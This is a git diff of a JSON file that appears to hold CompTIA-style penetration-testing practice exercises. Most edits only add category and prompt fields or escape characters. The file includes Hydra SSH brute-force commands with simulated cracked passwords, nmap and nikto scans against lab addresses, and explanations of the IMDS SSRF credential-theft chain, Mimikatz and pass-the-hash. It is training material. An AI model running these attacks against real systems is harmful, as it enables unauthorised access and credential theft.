@@ -161,7 +161,7 @@
         "expected": "23:00-06:00"
       }
     ],
-    "explanation": "The four bugs and why each matters:\n\n1. **`methodology: black-box` → `grey-box`** - The contract specifies grey-box (partial knowledge provided by the client). Testing under black-box assumptions when credentials and architecture diagrams have already been shared misrepresents the engagement scope and produces an inaccurate report.\n\n2. **Missing `authorized_by`** - This field names the individual with authority to grant permission for the test. Without it, the document cannot serve as a legal authorisation instrument. If an incident occurs during testing, the tester needs to demonstrate explicit, named sign-off.\n\n3. **`10.0.5.0/24` in `in_scope`** - This subnet appears in `out_of_scope`, meaning the client has explicitly forbidden testing it. Scanning or exploiting it would constitute unauthorised access and could breach computer fraud legislation regardless of the broader engagement authorisation.\n\n4. **`testing_window: 23:00-25:00`** - `25:00` is not a valid time. The intended value is `23:00-06:00` (late night to early morning). Testing outside the agreed window - even accidentally - can trigger client incident response procedures and violate the Rules of Engagement."
+    "explanation": "The four bugs and why each matters:\n\n1. **`methodology: black-box` \u2192 `grey-box`** - The contract specifies grey-box (partial knowledge provided by the client). Testing under black-box assumptions when credentials and architecture diagrams have already been shared misrepresents the engagement scope and produces an inaccurate report.\n\n2. **Missing `authorized_by`** - This field names the individual with authority to grant permission for the test. Without it, the document cannot serve as a legal authorisation instrument. If an incident occurs during testing, the tester needs to demonstrate explicit, named sign-off.\n\n3. **`10.0.5.0/24` in `in_scope`** - This subnet appears in `out_of_scope`, meaning the client has explicitly forbidden testing it. Scanning or exploiting it would constitute unauthorised access and could breach computer fraud legislation regardless of the broader engagement authorisation.\n\n4. **`testing_window: 23:00-25:00`** - `25:00` is not a valid time. The intended value is `23:00-06:00` (late night to early morning). Testing outside the agreed window - even accidentally - can trigger client incident response procedures and violate the Rules of Engagement."
   },
   {
     "id": "comptia-nmap-enumeration",
@@ -190,15 +190,18 @@
     "commands": [
       {
         "command": "nmap -sS -sV 10.10.10.50",
-        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0021s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n80/tcp   open  http    Apache httpd 2.4.41\n3306/tcp open  mysql   MySQL 8.0.32\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.43 seconds"
+        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0021s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n80/tcp   open  http    Apache httpd 2.4.41\n3306/tcp open  mysql   MySQL 8.0.32\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.43 seconds",
+        "category": "Port Scanning"
       },
       {
         "command": "nmap -O 10.10.10.50",
-        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0018s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5\nOS details: Linux 5.4 - 5.15\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.72 seconds"
+        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0018s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nDevice type: general purpose\nRunning: Linux 5.X\nOS CPE: cpe:/o:linux:linux_kernel:5\nOS details: Linux 5.4 - 5.15\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.72 seconds",
+        "category": "Port Scanning"
       },
       {
         "command": "nmap -oX scan.xml 10.10.10.50",
-        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0019s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n[+] XML output saved to scan.xml"
+        "output": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.50\nHost is up (0.0019s latency).\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n[+] XML output saved to scan.xml",
+        "category": "Port Scanning"
       }
     ],
     "expectedCommands": [
@@ -223,7 +226,8 @@
         "correct": true
       }
     ],
-    "explanation": "**`-sS` (SYN scan)** - Sends a TCP SYN packet and waits for a SYN-ACK (open) or RST (closed). Because the three-way handshake is never completed, the connection is not logged by most application-level logging. Requires raw socket privileges (root/Administrator).\n\n**`-sT` (connect scan)** - Completes the full TCP handshake. Use when you don't have raw socket privileges, but the completed connection is logged by the target service.\n\n**`-sV` (version detection)** - After identifying open ports, Nmap probes each service with protocol-specific payloads to identify the application and version. This significantly increases scan time but is essential for accurate vulnerability correlation.\n\n**`-O` (OS detection)** - Uses TCP/IP stack fingerprinting (TTL values, window sizes, TCP options) to guess the OS. Accuracy decreases through NAT and packet-filtering devices.\n\n**`-oX`** - XML output can be imported directly into Metasploit (`db_import`), vulnerability management platforms, and report generation tools. It preserves the full scan structure in a machine-readable format, unlike the default greppable output.\n\nFor a full enumeration run, combine flags: `nmap -sS -sV -O -oX scan.xml 10.10.10.50`."
+    "explanation": "**`-sS` (SYN scan)** - Sends a TCP SYN packet and waits for a SYN-ACK (open) or RST (closed). Because the three-way handshake is never completed, the connection is not logged by most application-level logging. Requires raw socket privileges (root/Administrator).\n\n**`-sT` (connect scan)** - Completes the full TCP handshake. Use when you don't have raw socket privileges, but the completed connection is logged by the target service.\n\n**`-sV` (version detection)** - After identifying open ports, Nmap probes each service with protocol-specific payloads to identify the application and version. This significantly increases scan time but is essential for accurate vulnerability correlation.\n\n**`-O` (OS detection)** - Uses TCP/IP stack fingerprinting (TTL values, window sizes, TCP options) to guess the OS. Accuracy decreases through NAT and packet-filtering devices.\n\n**`-oX`** - XML output can be imported directly into Metasploit (`db_import`), vulnerability management platforms, and report generation tools. It preserves the full scan structure in a machine-readable format, unlike the default greppable output.\n\nFor a full enumeration run, combine flags: `nmap -sS -sV -O -oX scan.xml 10.10.10.50`.",
+    "prompt": "root@kali:~# "
   },
   {
     "id": "comptia-dns-enumeration",
@@ -431,7 +435,7 @@
         "expected": "errors='ignore'"
       }
     ],
-    "explanation": "**Bug 1 - `s.connect((host, port))` → `s.connect((host, int(port)))`**\n\n`socket.connect()` requires the port to be an integer. The `TARGETS` list stores ports as strings (`\"22\"`, `\"80\"`). Passing a string raises `TypeError: an integer is required`. This is a common mistake when ports are read from config files or command-line arguments where all values arrive as strings.\n\n**Bug 2 - `whois.whois(domain, flags=0)` → `whois.whois(domain)`**\n\nThe `flags` keyword argument was removed in python-whois 0.8.0. Passing it raises `TypeError: whois() got an unexpected keyword argument 'flags'`. Always check library changelogs when adapting older scripts - deprecated arguments are a frequent source of breakage when dependencies are updated.\n\n**Bug 3 - `banner.decode()` → `banner.decode(errors='ignore')`**\n\n`bytes.decode()` defaults to UTF-8 strict mode. Many services (databases, proprietary protocols, binary handshakes) return bytes that are not valid UTF-8. A bare `decode()` raises `UnicodeDecodeError` and crashes the function. Passing `errors='ignore'` silently drops invalid bytes, allowing the banner to be captured even from binary-protocol services. For forensic work, `errors='replace'` (substitutes `�`) is preferable as it preserves byte position information."
+    "explanation": "**Bug 1 - `s.connect((host, port))` \u2192 `s.connect((host, int(port)))`**\n\n`socket.connect()` requires the port to be an integer. The `TARGETS` list stores ports as strings (`\"22\"`, `\"80\"`). Passing a string raises `TypeError: an integer is required`. This is a common mistake when ports are read from config files or command-line arguments where all values arrive as strings.\n\n**Bug 2 - `whois.whois(domain, flags=0)` \u2192 `whois.whois(domain)`**\n\nThe `flags` keyword argument was removed in python-whois 0.8.0. Passing it raises `TypeError: whois() got an unexpected keyword argument 'flags'`. Always check library changelogs when adapting older scripts - deprecated arguments are a frequent source of breakage when dependencies are updated.\n\n**Bug 3 - `banner.decode()` \u2192 `banner.decode(errors='ignore')`**\n\n`bytes.decode()` defaults to UTF-8 strict mode. Many services (databases, proprietary protocols, binary handshakes) return bytes that are not valid UTF-8. A bare `decode()` raises `UnicodeDecodeError` and crashes the function. Passing `errors='ignore'` silently drops invalid bytes, allowing the banner to be captured even from binary-protocol services. For forensic work, `errors='replace'` (substitutes `\ufffd`) is preferable as it preserves byte position information."
   },
   {
     "id": "comptia-nessus-authenticated-scan",
@@ -506,7 +510,7 @@
         ]
       }
     ],
-    "explanation": "**Credentialed Scanning (off → on)**\n\nUnauthenticated scans can only detect services visible from the network and check banners for known vulnerabilities. Credentialed scans log in using the supplied credentials and enumerate installed packages, patch levels, and configuration files from inside the host. Studies consistently show credentialed scans detect 2–3× more vulnerabilities than unauthenticated scans of the same host.\n\n**SSH Username (blank → pentest)**\n\nNessus requires a valid credential to perform authenticated checks. Leaving the SSH username blank means the credentialed scan option has no effect - Nessus falls back to unauthenticated checks silently. This is a common misconfiguration that produces deceptively thin reports with unexpectedly few findings.\n\n**Scan Intensity (stealth → normal)**\n\nStealth mode throttles probe rates and skips aggressive plugin families to reduce IDS/IPS detection. While appropriate for red team engagements, an internal penetration test with agreed testing windows should use normal intensity to ensure all plugin categories fire and no findings are missed due to scan throttling.\n\n**Safe Checks Override (enabled → disabled)**\n\nWhen safe checks is enabled, Nessus skips any plugin that could crash or destabilise a host. For a penetration test this prevents active exploitation plugins from running - resulting in false negatives for denial-of-service and overflow vulnerabilities. Disable safe checks only when disruption has been explicitly approved in the Rules of Engagement."
+    "explanation": "**Credentialed Scanning (off \u2192 on)**\n\nUnauthenticated scans can only detect services visible from the network and check banners for known vulnerabilities. Credentialed scans log in using the supplied credentials and enumerate installed packages, patch levels, and configuration files from inside the host. Studies consistently show credentialed scans detect 2\u20133\u00d7 more vulnerabilities than unauthenticated scans of the same host.\n\n**SSH Username (blank \u2192 pentest)**\n\nNessus requires a valid credential to perform authenticated checks. Leaving the SSH username blank means the credentialed scan option has no effect - Nessus falls back to unauthenticated checks silently. This is a common misconfiguration that produces deceptively thin reports with unexpectedly few findings.\n\n**Scan Intensity (stealth \u2192 normal)**\n\nStealth mode throttles probe rates and skips aggressive plugin families to reduce IDS/IPS detection. While appropriate for red team engagements, an internal penetration test with agreed testing windows should use normal intensity to ensure all plugin categories fire and no findings are missed due to scan throttling.\n\n**Safe Checks Override (enabled \u2192 disabled)**\n\nWhen safe checks is enabled, Nessus skips any plugin that could crash or destabilise a host. For a penetration test this prevents active exploitation plugins from running - resulting in false negatives for denial-of-service and overflow vulnerabilities. Disable safe checks only when disruption has been explicitly approved in the Rules of Engagement."
   },
   {
     "id": "comptia-nikto-web-scan",
@@ -535,15 +539,18 @@
     "commands": [
       {
         "command": "nikto -h http://10.10.10.80",
-        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        80\n+ Start Time:         2024-01-15 09:23:44 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined.\n+ The X-Content-Type-Options header is not set.\n+ OSVDB-3268: /phpmyadmin/: Directory indexing found.\n+ OSVDB-3092: /phpmyadmin/: phpMyAdmin is for managing MySQL databases, and should be protected.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3233: /icons/README: Apache default file found.\n+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host\n+ End Time:           2024-01-15 09:25:12 (GMT0) (88 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested"
+        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        80\n+ Start Time:         2024-01-15 09:23:44 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined.\n+ The X-Content-Type-Options header is not set.\n+ OSVDB-3268: /phpmyadmin/: Directory indexing found.\n+ OSVDB-3092: /phpmyadmin/: phpMyAdmin is for managing MySQL databases, and should be protected.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3233: /icons/README: Apache default file found.\n+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host\n+ End Time:           2024-01-15 09:25:12 (GMT0) (88 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested",
+        "category": "Web Scanning"
       },
       {
         "command": "nikto -h 10.10.10.80 -ssl -p 443",
-        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        443\n+ SSL Info:           Subject: /CN=10.10.10.80\n                     Ciphers: TLS_AES_256_GCM_SHA384\n                     Issuer:  /CN=10.10.10.80\n+ Start Time:         2024-01-15 09:26:00 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3092: /phpmyadmin/: phpMyAdmin accessible via HTTPS.\n+ 7915 requests: 0 error(s) and 3 item(s) reported on remote host\n+ End Time:           2024-01-15 09:27:45 (GMT0) (105 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested"
+        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        443\n+ SSL Info:           Subject: /CN=10.10.10.80\n                     Ciphers: TLS_AES_256_GCM_SHA384\n                     Issuer:  /CN=10.10.10.80\n+ Start Time:         2024-01-15 09:26:00 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3092: /phpmyadmin/: phpMyAdmin accessible via HTTPS.\n+ 7915 requests: 0 error(s) and 3 item(s) reported on remote host\n+ End Time:           2024-01-15 09:27:45 (GMT0) (105 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested",
+        "category": "Web Scanning"
       },
       {
         "command": "nikto -h 10.10.10.80 -o output.txt",
-        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        80\n+ Start Time:         2024-01-15 09:28:00 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3268: /phpmyadmin/: Directory indexing found.\n+ OSVDB-3233: /icons/README: Apache default file found.\n+ 7915 requests: 0 error(s) and 4 item(s) reported on remote host\n+ End Time:           2024-01-15 09:29:55 (GMT0) (115 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n[+] Results saved to output.txt"
+        "output": "- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          10.10.10.80\n+ Target Hostname:    10.10.10.80\n+ Target Port:        80\n+ Start Time:         2024-01-15 09:28:00 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.31 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ Apache/2.2.31 appears to be outdated (current is at least Apache/2.4.57).\n+ OSVDB-3268: /phpmyadmin/: Directory indexing found.\n+ OSVDB-3233: /icons/README: Apache default file found.\n+ 7915 requests: 0 error(s) and 4 item(s) reported on remote host\n+ End Time:           2024-01-15 09:29:55 (GMT0) (115 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n[+] Results saved to output.txt",
+        "category": "Web Scanning"
       }
     ],
     "expectedCommands": [
@@ -568,7 +575,8 @@
         "correct": true
       }
     ],
-    "explanation": "**Nikto's role in web application testing**\n\nNikto is a fast, open-source web server scanner that checks for over 6,700 potentially dangerous files, outdated server software, and version-specific problems. It is best described as a surface-area scanner - it identifies low-hanging fruit quickly but lacks the depth of tools like Burp Suite for manual injection testing.\n\n**`-ssl` flag**\n\nWithout `-ssl`, Nikto communicates over plain HTTP. Adding `-ssl` instructs Nikto to initiate a TLS handshake before sending probes, enabling scanning of HTTPS services. Combined with `-p 443`, it targets the standard HTTPS port. Omitting `-ssl` when scanning an HTTPS service results in a failed connection and zero findings.\n\n**Apache 2.2.31 - EOL finding**\n\nApache 2.2.x reached end-of-life in 2017. Running EOL software means no security patches are released for newly discovered vulnerabilities. Nikto cross-references the `Server` header against its vulnerability database and flags the version as outdated. This finding should be reported with the recommended upgrade path to a supported 2.4.x release.\n\n**`-o` output flag**\n\nThe `-o` flag saves results to a file. The output format is auto-detected from the extension (`.txt`, `.html`, `.xml`, `.csv`). XML output (e.g., `-o output.xml`) is preferred for pentest reports as it can be imported directly into vulnerability management platforms and report generation tools, preserving finding structure and metadata."
+    "explanation": "**Nikto's role in web application testing**\n\nNikto is a fast, open-source web server scanner that checks for over 6,700 potentially dangerous files, outdated server software, and version-specific problems. It is best described as a surface-area scanner - it identifies low-hanging fruit quickly but lacks the depth of tools like Burp Suite for manual injection testing.\n\n**`-ssl` flag**\n\nWithout `-ssl`, Nikto communicates over plain HTTP. Adding `-ssl` instructs Nikto to initiate a TLS handshake before sending probes, enabling scanning of HTTPS services. Combined with `-p 443`, it targets the standard HTTPS port. Omitting `-ssl` when scanning an HTTPS service results in a failed connection and zero findings.\n\n**Apache 2.2.31 - EOL finding**\n\nApache 2.2.x reached end-of-life in 2017. Running EOL software means no security patches are released for newly discovered vulnerabilities. Nikto cross-references the `Server` header against its vulnerability database and flags the version as outdated. This finding should be reported with the recommended upgrade path to a supported 2.4.x release.\n\n**`-o` output flag**\n\nThe `-o` flag saves results to a file. The output format is auto-detected from the extension (`.txt`, `.html`, `.xml`, `.csv`). XML output (e.g., `-o output.xml`) is preferred for pentest reports as it can be imported directly into vulnerability management platforms and report generation tools, preserving finding structure and metadata.",
+    "prompt": "root@kali:~# "
   },
   {
     "id": "comptia-hydra-ssh-brute",
@@ -598,11 +606,13 @@
     "commands": [
       {
         "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.22",
-        "output": "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 10:12:33\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.10.22:22/\n[22][ssh] host: 10.10.10.22   login: admin   password: sunshine1\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 10:14:07"
+        "output": "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 10:12:33\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking ssh://10.10.10.22:22/\n[22][ssh] host: 10.10.10.22   login: admin   password: sunshine1\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 10:14:07",
+        "category": "Brute Force"
       },
       {
         "command": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.22 -t 4",
-        "output": "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 10:16:00\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 57377596 login tries (l:4/p:14344399), ~14344399 tries per task\n[DATA] attacking ssh://10.10.10.22:22/\n[22][ssh] host: 10.10.10.22   login: sysadmin   password: Password123!\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 10:18:45"
+        "output": "Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-15 10:16:00\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 57377596 login tries (l:4/p:14344399), ~14344399 tries per task\n[DATA] attacking ssh://10.10.10.22:22/\n[22][ssh] host: 10.10.10.22   login: sysadmin   password: Password123!\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-15 10:18:45",
+        "category": "Brute Force"
       }
     ],
     "expectedCommands": [
@@ -626,7 +636,8 @@
         "correct": true
       }
     ],
-    "explanation": "**`-l` vs `-L`**\n\n`-l` (lowercase) specifies a single username directly: `-l admin`. `-L` (uppercase) loads a list of usernames from a file: `-L users.txt`. The same convention applies to passwords: `-p` for a single password, `-P` for a wordlist file.\n\n**`-t 4` - thread limiting**\n\nHydra defaults to 16 parallel tasks per host. Many SSH servers and enterprise authentication systems enforce account lockout after 3–5 failed attempts, or rate-limit connections. Using `-t 4` reduces parallelism, slowing the attack but reducing the risk of locking out the account or triggering an IDS alert. The Hydra warning message itself recommends `-t 4` for SSH.\n\n**Brute force as a last resort**\n\nBrute-force attacks are noisy, time-consuming, and risk account lockouts that disrupt legitimate users. In most engagements they are reserved for: (1) offline cracking of captured hashes, (2) password spraying when lockout thresholds are known to be high, or (3) specific scope items where no alternative exists. Credential stuffing (using known breach data) and pass-the-hash are often more efficient alternatives."
+    "explanation": "**`-l` vs `-L`**\n\n`-l` (lowercase) specifies a single username directly: `-l admin`. `-L` (uppercase) loads a list of usernames from a file: `-L users.txt`. The same convention applies to passwords: `-p` for a single password, `-P` for a wordlist file.\n\n**`-t 4` - thread limiting**\n\nHydra defaults to 16 parallel tasks per host. Many SSH servers and enterprise authentication systems enforce account lockout after 3\u20135 failed attempts, or rate-limit connections. Using `-t 4` reduces parallelism, slowing the attack but reducing the risk of locking out the account or triggering an IDS alert. The Hydra warning message itself recommends `-t 4` for SSH.\n\n**Brute force as a last resort**\n\nBrute-force attacks are noisy, time-consuming, and risk account lockouts that disrupt legitimate users. In most engagements they are reserved for: (1) offline cracking of captured hashes, (2) password spraying when lockout thresholds are known to be high, or (3) specific scope items where no alternative exists. Credential stuffing (using known breach data) and pass-the-hash are often more efficient alternatives.",
+    "prompt": "root@kali:~# "
   },
   {
     "id": "comptia-sqli-payload-fix",
@@ -895,7 +906,7 @@
         "correctOption": "Scope sts:AssumeRole to the specific target role ARN required by the function"
       }
     ],
-    "explanation": "**Issue 1 - Over-privileged EC2 Instance Role**\n\n`iam:*` grants the ability to create, modify, and attach IAM policies - a path to privilege escalation within the account. An attacker who gains code execution on the web server (via RCE or SSRF) can use the instance credentials to create a new admin user or attach an `AdministratorAccess` policy to an existing account. The remediation is least-privilege: grant only the specific actions the application requires (e.g., `s3:GetObject` on a specific bucket ARN), never wildcards on sensitive services.\n\n**Issue 2 - IMDSv1 Enabled (SSRF Attack Chain)**\n\nIMDSv1 serves IAM credentials to any process that can reach `http://169.254.169.254/`. If the application is vulnerable to SSRF, an attacker can forge a request to this address and retrieve temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken` values - effectively stealing the instance's IAM identity. IMDSv2 requires a PUT request to obtain a session token first, which SSRF attacks cannot perform due to HTTP method restrictions. Enforcing IMDSv2 (`HttpTokens: required`) breaks the SSRF → credential theft chain.\n\n**Issue 3 - Unrestricted AssumeRole**\n\n`sts:AssumeRole` on `arn:aws:iam::*:role/*` allows the Lambda to attempt to assume any role in any AWS account. While it still requires the target role's trust policy to permit the assumption, this is unnecessarily broad. If any role in the account or a partner account has an overly permissive trust policy (e.g., `Principal: {\"AWS\": \"*\"}`), the Lambda can assume it and escalate privileges. Scope the resource to the exact ARN of the target role - this is the principle of least privilege applied to cross-service trust."
+    "explanation": "**Issue 1 - Over-privileged EC2 Instance Role**\n\n`iam:*` grants the ability to create, modify, and attach IAM policies - a path to privilege escalation within the account. An attacker who gains code execution on the web server (via RCE or SSRF) can use the instance credentials to create a new admin user or attach an `AdministratorAccess` policy to an existing account. The remediation is least-privilege: grant only the specific actions the application requires (e.g., `s3:GetObject` on a specific bucket ARN), never wildcards on sensitive services.\n\n**Issue 2 - IMDSv1 Enabled (SSRF Attack Chain)**\n\nIMDSv1 serves IAM credentials to any process that can reach `http://169.254.169.254/`. If the application is vulnerable to SSRF, an attacker can forge a request to this address and retrieve temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken` values - effectively stealing the instance's IAM identity. IMDSv2 requires a PUT request to obtain a session token first, which SSRF attacks cannot perform due to HTTP method restrictions. Enforcing IMDSv2 (`HttpTokens: required`) breaks the SSRF \u2192 credential theft chain.\n\n**Issue 3 - Unrestricted AssumeRole**\n\n`sts:AssumeRole` on `arn:aws:iam::*:role/*` allows the Lambda to attempt to assume any role in any AWS account. While it still requires the target role's trust policy to permit the assumption, this is unnecessarily broad. If any role in the account or a partner account has an overly permissive trust policy (e.g., `Principal: {\"AWS\": \"*\"}`), the Lambda can assume it and escalate privileges. Scope the resource to the exact ARN of the target role - this is the principle of least privilege applied to cross-service trust."
   },
   {
     "id": "comptia-xss-incident-response",
@@ -1219,7 +1230,7 @@
         "definition": "Persistence - Scheduled Task/Job (T1053.005)"
       }
     ],
-    "explanation": "**VLAN Hopping → Initial Access**\n\nDouble-tagging exploits trunk ports that accept untagged frames by nesting two 802.1Q headers. The outer tag is stripped by the access switch, and the inner tag routes the packet to the target VLAN. This bypasses VLAN-based network segmentation without requiring credentials - it is an initial access or network bypass technique.\n\n**Pass-the-Hash → Lateral Movement**\n\nPtH authenticates to remote services using a stolen NTLM hash rather than a plaintext password. Its purpose is to move laterally from a compromised workstation to other hosts using the same credentials - ATT&CK T1550.002. It does not gain initial access or new credentials; it reuses existing ones across the network.\n\n**Mimikatz → Credential Access**\n\nDumping credentials from LSASS is classified under ATT&CK T1003 (OS Credential Dumping). The goal is to obtain authentication material (plaintext passwords, NTLM hashes, Kerberos tickets) for use in subsequent lateral movement or privilege escalation steps.\n\n**Process Injection → Defense Evasion / Privilege Escalation**\n\nT1055 covers techniques where code is injected into the address space of another process. This can evade security products that allowlist certain processes, and can escalate privileges if the target process runs at a higher integrity level.\n\n**Container Escape → Privilege Escalation**\n\nT1611 covers breaking out of container isolation to access the underlying host OS. A container started with `--privileged` has access to all host devices and capabilities - a trivial escape path that constitutes privilege escalation from container user to host root.\n\n**EC2 Metadata SSRF → Credential Access**\n\nT1552.005 describes obtaining credentials via the cloud instance metadata API. SSRF is the delivery mechanism, but the ATT&CK classification focuses on the outcome: cloud IAM credential theft.\n\n**Prompt Injection → Initial Access / Exfiltration**\n\nPrompt injection is an emerging technique targeting LLM-integrated applications. Malicious instructions embedded in user input or external data manipulate the model's behaviour - potentially bypassing access controls, exfiltrating data, or executing unintended actions. Modern security assessments increasingly include AI-integrated applications in scope as prompt injection becomes a recognized attack vector.\n\n**Scheduled Task → Persistence**\n\nT1053.005 covers Windows scheduled tasks created for persistence. The task executes attacker-controlled code on a recurring trigger (logon, startup, interval), maintaining access even after reboots or credential rotations."
+    "explanation": "**VLAN Hopping \u2192 Initial Access**\n\nDouble-tagging exploits trunk ports that accept untagged frames by nesting two 802.1Q headers. The outer tag is stripped by the access switch, and the inner tag routes the packet to the target VLAN. This bypasses VLAN-based network segmentation without requiring credentials - it is an initial access or network bypass technique.\n\n**Pass-the-Hash \u2192 Lateral Movement**\n\nPtH authenticates to remote services using a stolen NTLM hash rather than a plaintext password. Its purpose is to move laterally from a compromised workstation to other hosts using the same credentials - ATT&CK T1550.002. It does not gain initial access or new credentials; it reuses existing ones across the network.\n\n**Mimikatz \u2192 Credential Access**\n\nDumping credentials from LSASS is classified under ATT&CK T1003 (OS Credential Dumping). The goal is to obtain authentication material (plaintext passwords, NTLM hashes, Kerberos tickets) for use in subsequent lateral movement or privilege escalation steps.\n\n**Process Injection \u2192 Defense Evasion / Privilege Escalation**\n\nT1055 covers techniques where code is injected into the address space of another process. This can evade security products that allowlist certain processes, and can escalate privileges if the target process runs at a higher integrity level.\n\n**Container Escape \u2192 Privilege Escalation**\n\nT1611 covers breaking out of container isolation to access the underlying host OS. A container started with `--privileged` has access to all host devices and capabilities - a trivial escape path that constitutes privilege escalation from container user to host root.\n\n**EC2 Metadata SSRF \u2192 Credential 